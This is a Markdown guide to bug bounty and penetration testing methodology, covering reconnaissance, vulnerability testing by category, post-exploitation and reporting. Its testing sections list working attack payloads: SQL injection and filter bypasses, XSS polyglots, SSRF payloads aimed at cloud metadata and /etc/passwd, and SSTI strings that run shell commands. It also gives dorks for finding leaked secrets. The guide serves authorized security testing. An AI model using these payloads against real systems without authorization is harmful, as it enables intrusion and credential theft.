# BUG BOUNTY AND PENETRATION TESTING METHODOLOGY (COMPREHENSIVE GUIDE)

This document provides a complete, step-by-step methodology for bug bounty hunting and penetration testing. It follows the OWASP Web Security Testing Guide (WSTG) structure enhanced with real-world bug bounty techniques.

---

## 1. INFORMATION GATHERING (RECONNAISSANCE)

### 1.1. Passive Reconnaissance

Passive recon collects information WITHOUT directly interacting with the target.

#### What is Passive Recon?
Imagine you want to learn about a building before entering it. You would look at it from across the street, check public records, read news articles about it. You never touch the building or ring the doorbell. That is passive recon in cybersecurity - gathering information from public sources without the target knowing.

#### Techniques:

**A. Subdomain Enumeration**
```
Why: Subdomains often host development, staging, or internal tools that are less secured than the main site.

Tools:
- Subfinder: Fast passive subdomain discovery
  Command: subfinder -d target.com -all -o subdomains.txt

- Amass: Comprehensive subdomain enumeration
  Command: amass enum -passive -d target.com -o amass_subs.txt

- crt.sh: Certificate Transparency log search
  URL: https://crt.sh/?q=%.target.com

- SecurityTrails: Historical DNS data
  URL: https://securitytrails.com/domain/target.com

- Chaos (ProjectDiscovery): Bug bounty subdomain data
  Command: chaos -d target.com -o chaos_subs.txt

Manual:
- Google: site:*.target.com -www
- Bing: site:target.com
- DNSDumpster: https://dnsdumpster.com/
```

**B. DNS Analysis**
```
Why: DNS records reveal mail servers, cloud providers, CDNs, and sometimes internal infrastructure.

Records to check:
- A/AAAA: IP addresses (find hosting provider)
- MX: Mail servers (find email infrastructure)
- TXT: SPF/DKIM/DMARC (email security posture)
- CNAME: Aliases (find third-party services, potential subdomain takeover)
- NS: Name servers (find DNS provider)
- SOA: Zone authority (find admin contacts)

Tools:
- dig target.com ANY
- nslookup -type=any target.com
- host -a target.com
- dnsrecon -d target.com
```

**C. WHOIS and Registration Data**
```
Why: Reveals domain owner, registration dates, registrar, and sometimes contact info.

Tools:
- whois target.com
- https://who.is/whois/target.com
- https://domaintools.com/
```

**D. Certificate Transparency Logs**
```
Why: Every SSL certificate issued is logged publicly. This reveals subdomains the organization has obtained certificates for.

Sources:
- https://crt.sh/?q=%.target.com
- https://transparencyreport.google.com/https/certificates
- https://censys.io/certificates
```

**E. Web Archive Analysis**
```
Why: Old versions of websites may contain removed pages, exposed endpoints, leaked credentials, or deprecated functionality.

Tools:
- Wayback Machine: https://web.archive.org/web/*/target.com/*
- waybackurls: go tool that fetches all URLs from Wayback Machine
  Command: echo target.com | waybackurls > wayback_urls.txt
- gau (GetAllUrls): Fetches URLs from multiple sources
  Command: echo target.com | gau > all_urls.txt
```

**F. Google Dorking**
```
Why: Google indexes sensitive files, error pages, login panels, and exposed data that should not be public.

Key Dorks:
- site:target.com ext:sql | ext:env | ext:log | ext:bak
- site:target.com inurl:admin | inurl:login | inurl:dashboard
- site:target.com "password" | "api_key" | "secret"
- site:target.com intitle:"index of"
- site:target.com ext:php intitle:"phpinfo()"
- site:*.target.com -www
- site:github.com "target.com" password | secret | api_key
- site:pastebin.com "target.com"
- site:trello.com "target.com"
- site:s3.amazonaws.com "target"
```

**G. GitHub and Code Repository Recon**
```
Why: Developers accidentally commit secrets, API keys, internal URLs, and credentials to public repos.

Tools:
- truffleHog: Scans git repos for secrets
  Command: trufflehog git https://github.com/target-org/repo
- GitDorker: GitHub dorking tool
- gitrob: Find sensitive files in GitHub repos
- gitleaks: Detect secrets in git repos
  Command: gitleaks detect --source=./repo --report-path=leaks.json

Manual GitHub Dorks:
- org:target-org password
- org:target-org secret
- org:target-org api_key
- org:target-org AWS_SECRET_ACCESS_KEY
- org:target-org PRIVATE KEY
- "target.com" password filename:.env
```

**H. Shodan / Censys / ZoomEye**
```
Why: These search engines index internet-connected devices and services, revealing open ports, services, and misconfigurations.

Shodan Queries:
- hostname:target.com
- ssl.cert.subject.cn:target.com
- org:"Target Organization"
- http.title:"Target Application"

Censys Queries:
- parsed.names: target.com
- services.http.response.headers.server: *
```


### 1.2. Active Reconnaissance

Active recon involves DIRECTLY interacting with the target. The target may log your activity.

#### What is Active Recon?
Now you are walking up to the building, trying doors, looking through windows, checking if the back door is unlocked. The building security cameras might record you. That is active recon.

**A. Port Scanning**
```
Why: Open ports reveal running services. Each service is a potential attack surface.

Tools:
- Nmap (comprehensive):
  Quick scan: nmap -sV -sC -T4 target.com
  Full scan: nmap -sV -sC -p- -T4 target.com
  UDP scan: nmap -sU --top-ports 100 target.com
  Script scan: nmap --script vuln target.com

- Masscan (fast):
  Command: masscan -p1-65535 target.com --rate=1000

- RustScan (fastest):
  Command: rustscan -a target.com -- -sV -sC

Key Ports to Look For:
  21 (FTP) - Anonymous login? Version vulnerabilities?
  22 (SSH) - Weak credentials? Old version?
  25 (SMTP) - Open relay? User enumeration?
  53 (DNS) - Zone transfer? Cache poisoning?
  80/443 (HTTP/S) - Web application testing
  110/143 (POP3/IMAP) - Email access
  389/636 (LDAP) - Directory service attacks
  445 (SMB) - EternalBlue? Null sessions?
  1433 (MSSQL) - Default credentials?
  3306 (MySQL) - Remote access? Weak auth?
  3389 (RDP) - BlueKeep? Brute force?
  5432 (PostgreSQL) - Remote access?
  6379 (Redis) - Unauthenticated access?
  8080/8443 (Alt HTTP) - Admin panels?
  9200 (Elasticsearch) - Unauthenticated?
  27017 (MongoDB) - Unauthenticated?
```

**B. Web Technology Fingerprinting**
```
Why: Knowing the exact technology stack helps you find relevant CVEs and known vulnerabilities.

Tools:
- Wappalyzer (browser extension): Identifies technologies on websites
- WhatWeb: Command-line web scanner
  Command: whatweb target.com
- BuiltWith: https://builtwith.com/target.com
- httpx: HTTP toolkit
  Command: httpx -l subdomains.txt -title -tech-detect -status-code -follow-redirects
```

**C. Directory and File Discovery**
```
Why: Hidden directories and files may contain admin panels, backups, configuration files, or debug endpoints.

Tools:
- ffuf (fastest):
  Command: ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,403
  Recursive: ffuf -w wordlist.txt -u https://target.com/FUZZ -mc 200,301,302,403 -recursion -recursion-depth 2

- feroxbuster:
  Command: feroxbuster -u https://target.com -w wordlist.txt

- dirsearch:
  Command: python dirsearch.py -u https://target.com -e php,asp,aspx,jsp,html,js

- gobuster:
  Command: gobuster dir -u https://target.com -w wordlist.txt -x php,html,js,txt

Wordlists:
- SecLists: https://github.com/danielmiessler/SecLists
- Assetnote Wordlists: https://wordlists.assetnote.io/
- FuzzDB: https://github.com/fuzzdb-project/fuzzdb
```

**D. Parameter Discovery**
```
Why: Hidden parameters can lead to IDOR, injection, or other vulnerabilities.

Tools:
- Arjun: HTTP parameter discovery
  Command: arjun -u https://target.com/endpoint

- ParamSpider: Mining parameters from web archives
  Command: python paramspider.py -d target.com

- x8: Hidden parameter discovery
  Command: x8 -u https://target.com/endpoint -w params.txt
```

---

## 2. VULNERABILITY TESTING BY CATEGORY

### 2.1. Injection Vulnerabilities

#### SQL Injection (SQLi)
```
Concept (Beginner):
Imagine a librarian who takes your request slip and reads it directly to the database.
If your slip says "Find book named: Harry Potter", the librarian asks the database:
  SELECT * FROM books WHERE name = 'Harry Potter'

But what if your slip says: "Find book named: ' OR '1'='1"
The librarian blindly reads:
  SELECT * FROM books WHERE name = '' OR '1'='1'
This returns ALL books because '1'='1' is always true.

That is SQL Injection - tricking the application into executing unintended database commands.

Types:
1. Error-based: The database error message reveals data
2. Union-based: Use UNION to combine results with your query
3. Blind (Boolean): Ask true/false questions, observe response differences
4. Blind (Time-based): Use SLEEP() to infer data from response time
5. Out-of-band: Exfiltrate data via DNS or HTTP requests
6. Second-order: Payload stored first, executed later in different context

Testing:
- Add single quote (') to parameters and observe errors
- Try: ' OR '1'='1 / ' OR '1'='2 (compare responses)
- Try: 1 AND 1=1 / 1 AND 1=2 (compare responses)
- Try: ' UNION SELECT NULL-- (increment NULLs until no error)
- Try: ' AND SLEEP(5)-- (observe response delay)
- Use SQLMap: sqlmap -u "https://target.com/page?id=1" --batch --dbs

Bypass Techniques:
- Case variation: SeLeCt, UnIoN
- Comments: /**/UNION/**/SELECT
- URL encoding: %27 for ', %20 for space
- Double encoding: %2527 for '
- Null bytes: %00
- Inline comments: /*!UNION*/ /*!SELECT*/
- Concatenation: CONCAT(), ||, +
- Alternative syntax: GROUP BY / ORDER BY for column count
```

#### Cross-Site Scripting (XSS)
```
Concept (Beginner):
Imagine a bulletin board where anyone can post messages. If the board does not check what people write, someone could post a message that contains instructions for the board itself.

For example, instead of writing "Hello everyone!", they write:
  <script>steal_cookies()</script>

When other people read the bulletin board, their browser executes those instructions, potentially stealing their login session.

Types:
1. Reflected XSS: Payload in URL, reflected in response (one-time)
2. Stored XSS: Payload saved in database, shown to all users (persistent)
3. DOM-based XSS: Payload processed by client-side JavaScript
4. Blind XSS: Payload triggers in admin panel or backend you cannot see
5. Self-XSS: Only affects the user who enters it (low impact, but can be chained)

Testing Contexts:
1. HTML body: <script>alert(1)</script>
2. HTML attribute: " onmouseover="alert(1)
3. JavaScript string: '-alert(1)-'
4. URL/href: javascript:alert(1)
5. CSS: expression(alert(1))
6. Inside <script> tag: </script><script>alert(1)</script>

Advanced Payloads:
- SVG: <svg/onload=alert(document.domain)>
- Details: <details open ontoggle=alert(1)>
- Body: <body onload=alert(1)>
- Input: <input onfocus=alert(1) autofocus>
- Marquee: <marquee onstart=alert(1)>
- Template literals: ${alert(1)}
- Polyglot: jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )
```


#### Server-Side Request Forgery (SSRF)
```
Concept (Beginner):
Imagine you are at a restaurant and you ask the waiter to call a phone number for you.
The waiter (server) makes the call on your behalf. But what if you give the waiter
the phone number of the restaurant manager private line? The waiter does not know
it is internal-only and makes the call, giving you access to internal communications.

SSRF is when you trick a server into making requests to internal resources that you
should not have access to.

Common Locations:
- URL parameters (url=, path=, src=, dest=, redirect=, uri=, img=)
- File upload via URL
- PDF generators (HTML to PDF)
- Webhook URLs
- Import from URL features
- RSS/Atom feed parsers
- Image/video processing

Payloads:
- http://127.0.0.1
- http://localhost
- http://[::1]
- http://0.0.0.0
- http://169.254.169.254/latest/meta-data/ (AWS)
- http://metadata.google.internal/ (GCP)
- file:///etc/passwd
- gopher://127.0.0.1:6379/_INFO (Redis)

Bypass Techniques:
- IP encoding: decimal (2130706433), octal (0177.0.0.1), hex (0x7f.0x0.0x0.0x1)
- DNS rebinding: Use a domain that resolves to 127.0.0.1
- URL parsing confusion: http://evil.com@127.0.0.1
- Redirect chains: Your server redirects to internal IP
- IPv6: http://[::ffff:127.0.0.1]
- URL shorteners
- Double URL encoding
```

#### Server-Side Template Injection (SSTI)
```
Concept (Beginner):
Web applications use templates to generate HTML pages. Templates have special syntax
like {{username}} that gets replaced with actual data. If user input goes directly
into a template without sanitization, an attacker can inject template code that
executes on the server.

Detection:
- Input: {{7*7}} -> Output: 49 (Jinja2, Twig)
- Input: ${7*7} -> Output: 49 (FreeMarker, Velocity)
- Input: #{7*7} -> Output: 49 (Thymeleaf)
- Input: <%= 7*7 %> -> Output: 49 (ERB, EJS)
- Input: {{7*'7'}} -> Output: 7777777 (Jinja2 confirmed)

Exploitation by Engine:
- Jinja2 (Python): {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
- Twig (PHP): {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
- FreeMarker (Java): ${"freemarker.template.utility.Execute"?new()("id")}
- Velocity (Java): #set($x='')##$x.class.forName('java.lang.Runtime').getRuntime().exec('id')
- ERB (Ruby): <%= system('id') %>
```

### 2.2. Authentication and Session Management

```
Tests:
1. Default credentials (admin:admin, admin:password, etc.)
2. Brute force protection (is there rate limiting? account lockout?)
3. Password reset flaws:
   - Predictable reset tokens
   - Token not expiring after use
   - Token sent in URL (logged in referer)
   - Host header injection in reset emails
4. Session management:
   - Session token entropy (is it predictable?)
   - Session fixation (can you set someone else session?)
   - Session not invalidated on logout
   - Session not invalidated on password change
   - Concurrent session handling
5. MFA bypass:
   - Skip MFA step by directly accessing post-MFA URL
   - Brute force MFA code (no rate limiting)
   - MFA code reuse
   - Response manipulation (change "success":false to true)
6. OAuth/SSO flaws:
   - Open redirect in redirect_uri
   - State parameter missing/predictable
   - Token leakage via referer
   - Scope escalation
```

### 2.3. Authorization and Access Control

```
Concept (Beginner):
Authentication = "Who are you?" (proving your identity)
Authorization = "What can you do?" (what you are allowed to access)

A bouncer at a club checks your ID (authentication) and then checks if you are on
the VIP list (authorization). Authorization bugs mean the bouncer lets you into the
VIP area even though you are not on the list.

Tests:
1. IDOR (Insecure Direct Object Reference):
   - Change user ID in URL: /api/users/123 -> /api/users/124
   - Change object ID in request body
   - Try sequential IDs, UUIDs from other users
   - Test across different HTTP methods (GET, PUT, DELETE)

2. Privilege Escalation:
   - Horizontal: Access another user data (same privilege level)
   - Vertical: Access admin functionality as regular user
   - Test by:
     * Changing role parameter in request
     * Accessing admin endpoints with user token
     * Modifying JWT claims (role, is_admin, etc.)
     * Force browsing to admin URLs

3. Missing Function Level Access Control:
   - Can you access /admin without admin role?
   - Can you call admin API endpoints with user token?
   - Are there hidden API endpoints with no auth check?

4. Mass Assignment:
   - Add extra parameters: {"name":"test", "role":"admin"}
   - Try adding: is_admin, role, privilege, verified, active
```

### 2.4. Business Logic Vulnerabilities

```
Concept (Beginner):
Business logic bugs are not about technical flaws like SQL injection.
They are about the application not properly enforcing its own rules.

Example: An online store says "maximum 1 coupon per order" but the code
only checks this on the frontend. By sending the request directly to the
API, you can apply 10 coupons.

Common Business Logic Bugs:
1. Price manipulation:
   - Change price in request (client-side price)
   - Negative quantity (get money credited)
   - Currency conversion abuse
   - Rounding errors in calculations

2. Workflow bypass:
   - Skip steps in multi-step process
   - Complete step 3 before step 1
   - Replay successful payment with different cart

3. Rate/limit bypass:
   - Coupon reuse
   - Referral abuse
   - Free trial extension
   - Vote/like manipulation

4. Feature abuse:
   - Email verification bypass
   - Phone verification bypass
   - KYC bypass
   - Invite system abuse
```

---

## 3. POST-EXPLOITATION AND IMPACT MAXIMIZATION

```
After finding a vulnerability, maximize its impact:

1. Chain with other findings:
   - XSS + CSRF = Account Takeover
   - SSRF + Cloud Metadata = AWS Credentials
   - IDOR + PII = Mass Data Breach
   - SQLi + File Write = RCE

2. Demonstrate real impact:
   - Do not just show alert(1) for XSS. Show cookie theft, account takeover
   - Do not just show database name for SQLi. Show sensitive data access
   - Do not just show internal IP for SSRF. Show cloud credential access

3. Calculate business impact:
   - How many users affected?
   - What data is exposed?
   - What is the financial impact?
   - What is the regulatory impact (GDPR, HIPAA, PCI-DSS)?
```

---

## 4. REPORTING BEST PRACTICES

```
A good report structure:

1. Title: Clear, descriptive (e.g., "Stored XSS in Comment Feature Leading to Account Takeover")
2. Severity: CVSS score with justification
3. Summary: 2-3 sentences describing the issue
4. Steps to Reproduce: Numbered, exact steps anyone can follow
5. Proof of Concept: Code, screenshots, video
6. Impact: Real-world business impact
7. Remediation: How to fix it
8. References: CVEs, OWASP, CWE numbers

Tips:
- Be professional and respectful
- Include ALL information needed to reproduce
- Do not over-access data (stop at proof)
- Suggest specific fixes, not just "fix the bug"
- Follow up politely if no response in 5-7 business days
```

---

*This methodology is a living document. Update it as you learn new techniques and discover new vulnerability classes.*

